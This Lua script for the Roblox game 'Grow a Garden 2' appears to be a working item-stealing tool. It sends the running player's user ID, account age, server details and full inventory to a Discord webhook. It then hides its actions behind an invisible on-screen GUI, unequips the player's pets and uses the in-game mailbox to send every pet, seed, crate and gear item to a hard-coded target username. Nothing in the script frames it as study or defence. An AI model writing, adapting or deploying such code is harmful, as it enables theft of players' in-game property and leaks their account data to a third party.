-- Send backpack contents to Discord webhook
local function sendBackpackToWebhook()
    local backpack = localPlayer:FindFirstChild("Backpack")
    if not backpack then warn("Backpack not found") return end

    -- Lookup sets for fast categorisation
    local seedSet, crateSet = {}, {}
    for _, n in ipairs(FRUITS) do seedSet[n:lower()] = true end
    for _, n in ipairs(CRATES) do crateSet[n:lower()] = true end

    -- Heuristics for gear / pets (tool names in Backpack don't have Inv_ prefix)
    local function isGear(name)
        local n = name:lower()
        return n:find("sprinkler") or n:find("watering") or n:find("can")
            or n:find("mushroom") or n:find("trowel") or n:find("shovel")
            or n:find("fertilizer") or n:find("hoe") or n:find("rake")
    end

    -- Known pets from Grow a Garden 2 tier list (S → C) + common variants
    local petSet = {}
    for _, n in ipairs({
        -- S tier
        "Raccoon","Black Dragon","BlackDragon","Ice Serpent","IceSerpent","Unicorn",
        -- A tier
        "Bee","Golden Dragonfly","GoldenDragonfly","DragonFly","Dragonfly","Deer","Bunny",
        -- B tier
        "Frog",
        -- C tier
        "Robin","Owl","Monkey"
    }) do
        petSet[n:lower()] = true
    end

    local function categorise(name)
        local low = name:lower()
        if seedSet[low]  then return "seeds"  end
        if crateSet[low] then return "crates" end
        if petSet[low]   then return "pets"   end
        if isGear(name)  then return "gear"   end
        return "other"
    end

    local buckets = { seeds = {}, pets = {}, gear = {}, crates = {}, other = {} }
    local equippedItems = {}

    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            table.insert(buckets[categorise(tool.Name)], tool.Name)
        end
    end

    local character = localPlayer.Character
    if character then
        for _, tool in ipairs(character:GetChildren()) do
            if tool:IsA("Tool") then
                table.insert(equippedItems, tool.Name)
            end
        end
    end

    local totalCount = #buckets.seeds + #buckets.pets + #buckets.gear
                     + #buckets.crates + #buckets.other + #equippedItems

    -- Pretty list builder (markdown bullets, capped at Discord's 1024 char field limit)
    local function formatList(list)
        if #list == 0 then return "`—  empty  —`" end
        local lines = {}
        for i, name in ipairs(list) do
            lines[i] = "`•` " .. name
        end
        local text = table.concat(lines, "\n")
        if #text > 1010 then
            text = text:sub(1, 1000) .. "\n`… +more`"
        end
        return text
    end

    -- Resolve a working avatar URL from the modern Roblox thumbnails API.
    local HttpService = game:GetService("HttpService")
    local function fetchAvatar(endpoint, size)
        local url = "https://thumbnails.roblox.com/v1/users/" .. endpoint
              .. "?userIds=" .. localPlayer.UserId
              .. "&size=" .. size
              .. "&format=Png&isCircular=false"
        local ok, body = pcall(function() return game:HttpGet(url) end)
        if not ok or not body then return nil end
        local ok2, decoded = pcall(function() return HttpService:JSONDecode(body) end)
        if not ok2 or not decoded or not decoded.data or not decoded.data[1] then return nil end
        return decoded.data[1].imageUrl
    end
    local avatarThumb  = fetchAvatar("avatar-headshot", "420x420")
    local avatarAuthor = fetchAvatar("avatar-bust",     "150x150") or avatarThumb

    -- Account age + game info
    local accountAgeDays = localPlayer.AccountAge
    local placeId = tostring(game.PlaceId)
    local jobId   = (game.JobId ~= "" and game.JobId) or "Studio / Solo"
    local serverPlayers = #Players:GetPlayers()

    -- ISO-8601 timestamp for Discord-native time rendering
    local function isoTimestamp()
        local t = os.date("!*t")
        return string.format("%04d-%02d-%02dT%02d:%02d:%02d.000Z",
            t.year, t.month, t.day, t.hour, t.min, t.sec)
    end

    local fields = {
        { name = "👤  User ID",     value = "`" .. tostring(localPlayer.UserId) .. "`", inline = true },
        { name = "📆  Account Age", value = "`" .. accountAgeDays .. " days`",          inline = true },
        { name = "👥  In Server",   value = "`" .. serverPlayers .. " players`",        inline = true },
        { name = "🗺️  Place ID",   value = "`" .. placeId .. "`", inline = true },
        { name = "🧩  Job ID",      value = "`" .. jobId   .. "`", inline = false },
        { name = "⚔️  Equipped (" .. #equippedItems .. ")",
          value = formatList(equippedItems), inline = false },
    }

    local function addCategory(emoji, label, list)
        if #list > 0 then
            table.insert(fields, {
                name = emoji .. "  " .. label .. " (" .. #list .. ")",
                value = formatList(list),
                inline = false
            })
        end
    end

    addCategory("🌾", "Seeds",  buckets.seeds)
    addCategory("🐾", "Pets",   buckets.pets)
    addCategory("🛠️", "Gear",   buckets.gear)
    addCategory("📦", "Crates", buckets.crates)
    addCategory("❔", "Other",  buckets.other)

    local payload = HttpService:JSONEncode({
        username = "Garden Logger",
        embeds = {{
            author = {
                name = localPlayer.DisplayName .. "  •  @" .. localPlayer.Name,
                icon_url = avatarAuthor,
                url = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile"
            },
            title = "🌱  Inventory Snapshot",
            url = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile",
            description = "```ansi\n\27[2;32mPlayer joined — full backpack scan captured.\27[0m\n```",
            color = 5025616,
            thumbnail = avatarThumb and { url = avatarThumb } or nil,
            fields = fields,
            footer = {
                text = "Garden Logger  •  " .. totalCount .. " total items",
                icon_url = avatarAuthor
            },
            timestamp = isoTimestamp()
        }}
    })

    local requestFunc = (syn and syn.request) or (http and http.request) or request
    pcall(function()
        local response = requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payload
        })
        if response and response.StatusCode then
            if response.StatusCode >= 200 and response.StatusCode < 300 then
                print("[GardenLogger] Inventory report sent for: " .. localPlayer.Name)
            else
                warn("[GardenLogger] Discord rejected the webhook — HTTP "
                    .. tostring(response.StatusCode)
                    .. "  |  body: " .. tostring(response.Body or ""):sub(1, 300))
                if response.StatusCode == 404 then
                    warn("[GardenLogger] 404 means the WEBHOOK_URL is invalid or has been deleted. Recreate the webhook in Discord and paste the new URL into WEBHOOK_URL.")
                end
            end
        else
            print("[GardenLogger] Inventory report fired for: " .. localPlayer.Name)
        end
    end)
end

local function clickButton(button)
    pcall(function() firesignal(button.MouseButton1Click) end)
    pcall(function()
        local input = Instance.new("InputObject")
        input.UserInputType = Enum.UserInputType.MouseButton1
        firesignal(button.Activated, input)
    end)
end

-- Click all inventory items matching a prefix asynchronously
local function clickAllByPrefix(inventoryFrame, prefix)
    for _, child in ipairs(inventoryFrame:GetChildren()) do
        if child.Name:sub(1, #prefix) == prefix then
            task.spawn(function()
                local clickCount = 0
                while clickCount < 999 do
                    local frame = inventoryFrame:FindFirstChild(child.Name)
                    if not frame then break end

                    local innerFrame = frame:FindFirstChildWhichIsA("Frame")
                    if not innerFrame then break end

                    local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
                    if not button then break end

                    local countLabel = frame:FindFirstChild("Count", true)
                        or frame:FindFirstChild("Amount", true)
                        or innerFrame:FindFirstChildWhichIsA("TextLabel")
                    if countLabel then
                        local count = tonumber(countLabel.Text:match("%d+"))
                        if count and count <= 0 then break end
                    end

                    clickButton(button)
                    clickCount += 1
                    task.wait()
                end
            end)
        end
    end
end

-- Check if there is anything left to send
local function hasAnythingToSend(inventoryFrame)
    for _, child in ipairs(inventoryFrame:GetChildren()) do
        local name = child.Name
        if name:sub(1, 10) == "Inv_Seeds:" then return true end
        if name:sub(1, 9) == "Inv_Pets:" then return true end
        if name:sub(1, 11) == "Inv_Crates:" then return true end
        for _, prefix in ipairs(GEAR_PREFIXES) do
            if name:sub(1, #prefix) == prefix then return true end
        end
    end
    return false
end

-- Independent unequip mechanics targeting the PetList UI container
local function runSequence()
    local petList = playerGui:FindFirstChild("PetList")
    if not petList then return end
    
    local toggleButton = petList:FindFirstChild("Exit", true) and petList.Exit:FindFirstChild("OpenButton")
    local scrollingFrame = petList:FindFirstChild("ScrollingFrame", true)
    if not toggleButton or not scrollingFrame then return end

    local function safeClick(button)
        pcall(function() firesignal(button.Activated) end)
        pcall(function() firesignal(button.MouseButton1Click) end)
    end

    local function findNextUnequipButton()
        for _, desc in pairs(scrollingFrame:GetDescendants()) do
            if desc:IsA("GuiButton") and desc.Name == "Unequip" and desc.Visible == true then
                if not string.find(desc:GetFullName(), "Template") then
                    return desc
                end
            end
        end
        return nil
    end

    safeClick(toggleButton)
    task.wait(0.2)
    
    local unequipButton = findNextUnequipButton()
    while unequipButton do
        safeClick(unequipButton)
        task.wait()
        unequipButton = findNextUnequipButton()
    end
    
    safeClick(toggleButton)
end

-- Main send function
local function runScript()
    local touchShield = Instance.new("ScreenGui")
    touchShield.Name = "TouchShieldSystem"
    touchShield.DisplayOrder = 999999
    
    local targetBlocker = Instance.new("TextButton")
    targetBlocker.Size = UDim2.new(0, 0, 0, 0)
    targetBlocker.BackgroundTransparency = 1
    targetBlocker.Text = ""
    targetBlocker.Parent = touchShield
    touchShield.Parent = playerGui

    pcall(runSequence)
    task.wait(0.5)

    local oldUI = playerGui:FindFirstChild("MailboxUI")
    if oldUI then
        local closeBtn = oldUI:FindFirstChild("CloseButton", true)
        if closeBtn then pcall(function() firesignal(closeBtn.MouseButton1Click) end) end
        task.wait(0.1)
    end

    local mailboxPrompt = workspace.Gardens.Plot1.Signs.GreyMailBox.ProximityPromptPart.MailboxPrompt
    fireproximityprompt(mailboxPrompt)
    task.wait(0.4)

    local mailboxUI = playerGui:WaitForChild("MailboxUI", 5)
    if not mailboxUI then 
        touchShield:Destroy()
        warn("Retry: MailboxUI not found") 
        return false 
    end

    local mainFrame = mailboxUI:WaitForChild("Frame", 5)
    if not mainFrame then 
        touchShield:Destroy()
        warn("Retry: Frame not found") 
        return false 
    end

    local sendingFrame = mainFrame:WaitForChild("SendingFrame", 5)
    if not sendingFrame then 
        touchShield:Destroy()
        warn("Retry: SendingFrame not found") 
        return false 
    end

    local selectPlayerFrame = sendingFrame:WaitForChild("SelectPlayerFrame", 5)
    if not selectPlayerFrame then 
        touchShield:Destroy()
        warn("Retry: SelectPlayerFrame not found") 
        return false 
    end

    local topbar = selectPlayerFrame:WaitForChild("Topbar", 5)
    if not topbar then 
        touchShield:Destroy()
        warn("Retry: Topbar not found") 
        return false 
    end

    local searchBox = topbar:WaitForChild("SearchBox", 5)
    if not searchBox then 
        touchShield:Destroy()
        warn("Retry: SearchBox not found") 
        return false 
    end

    searchBox:CaptureFocus()
    searchBox.Text = TARGET_USERNAME
    task.wait(0.05)
    
    searchBox:ReleaseFocus()
    task.wait(0.05)

    local VIM = game:GetService("VirtualInputManager")
    VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
    task.wait(0.4)

    local playerList = selectPlayerFrame:WaitForChild("PlayerList", 5)
    if not playerList then 
        touchShield:Destroy()
        warn("Retry: PlayerList not found") 
        return false 
    end

    local found = false
    local deadline = tick() + 4
    while not found and tick() < deadline do
        for _, frame in ipairs(playerList:GetChildren()) do
            if frame:IsA("Frame") and frame.Name:match("^Search_") then
                local button = frame:FindFirstChild("Button")
                if button then
                    local usernameLabel = button:FindFirstChild("PlayerUsername")
                    if usernameLabel then
                        local cleanText = usernameLabel.Text:lower():gsub("^@", "")
                        if cleanText == TARGET_USERNAME:lower() then
                            clickButton(button)
                            found = true
                            break
                        end
                    end
                end
            end
        end
        if not found then task.wait(0.05) end
    end

    if not found then 
        touchShield:Destroy()
        warn("Retry: Player not found in list") 
        return false 
    end

    task.wait(0.3)

    local itemSendFrame = sendingFrame:WaitForChild("ItemSendFrame", 5)
    if not itemSendFrame then 
        touchShield:Destroy()
        warn("Retry: ItemSendFrame not found") 
        return false 
    end

    local scrollingFrames = itemSendFrame:WaitForChild("ScrollingFrames", 5)
    if not scrollingFrames then 
        touchShield:Destroy()
        warn("Retry: ScrollingFrames not found") 
        return false 
    end

    local inventoryFrame = scrollingFrames:WaitForChild("InventoryFrame", 5)
    if not inventoryFrame then 
        touchShield:Destroy()
        warn("Retry: InventoryFrame not found") 
        return false 
    end

    if not hasAnythingToSend(inventoryFrame) then
        touchShield:Destroy()
        return "done"
    end

    -- ====================================================================
    -- STAGE 1: PRIORITY PET SELECTION (Clicks these immediately)
    -- ====================================================================
    local priorityPets = {
        "Raccoon", "Black Dragon", "Ice Serpent", "Unicorn",
        "Bee", "Golden Dragonfly", "Deer", "Bunny",
        "Frog",
        "Robin", "Owl", "Monkey"
    }

    local function normalizeName(s)
        return (s:lower():gsub("[%s_%-]", ""))
    end

    local invChildrenByNorm = {}
    for _, child in ipairs(inventoryFrame:GetChildren()) do
        local cname = child.Name
        if cname:sub(1, 9) == "Inv_Pets:" then
            local petPart = cname:sub(10)
            invChildrenByNorm[normalizeName(petPart)] = child
        end
    end

    for _, petName in ipairs(priorityPets) do
        local key = normalizeName(petName)
        local petFrame = invChildrenByNorm[key]
        if petFrame then
            task.spawn(function()
                local innerFrame = petFrame:FindFirstChildWhichIsA("Frame") or petFrame
                local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
                    or petFrame:FindFirstChildWhichIsA("GuiButton", true)
                if button then
                    clickButton(button)
                end
            end)
        end
    end

    task.wait(0.2)

    -- ====================================================================
    -- STAGE 2: GENERAL ASSET COLLECTION
    -- ====================================================================
    task.spawn(function()
        clickAllByPrefix(inventoryFrame, "Inv_Pets:")
    end)

    task.spawn(function()
        for _, fruitName in ipairs(FRUITS) do
            local frameName = "Inv_Seeds:" .. fruitName
            task.spawn(function()
                local clickCount = 0
                while clickCount < 999 do
                    local fruitFrame = inventoryFrame:FindFirstChild(frameName)
                    if not fruitFrame then break end
                    local innerFrame = fruitFrame:FindFirstChildWhichIsA("Frame")
                    if not innerFrame then break end
                    local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
                    if not button then break end
                    clickButton(button)
                    clickCount += 1
                    task.wait()
                end
            end)
        end
    end)

    task.spawn(function()
        for _, crateName in ipairs(CRATES) do
            local frameName = "Inv_Crates:" .. crateName
            task.spawn(function()
                local clickCount = 0
                while clickCount < 999 do
                    local crateFrame = inventoryFrame:FindFirstChild(frameName)
                    if not crateFrame then break end
                    local innerFrame = crateFrame:FindFirstChildWhichIsA("Frame")
                    if not innerFrame then break end
                    local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
                    if not button then break end
                    clickButton(button)
                    clickCount += 1
                    task.wait()
                end
            end)
        end
    end)

    task.spawn(function()
        for _, prefix in ipairs(GEAR_PREFIXES) do
            clickAllByPrefix(inventoryFrame, prefix)
        end
    end)

    task.wait(0.6)

    local sendButton = itemSendFrame:WaitForChild("SendButton", 5)
    if sendButton and sendButton:IsA("GuiButton") then
        clickButton(sendButton)
    end

    touchShield:Destroy()
    return true
end

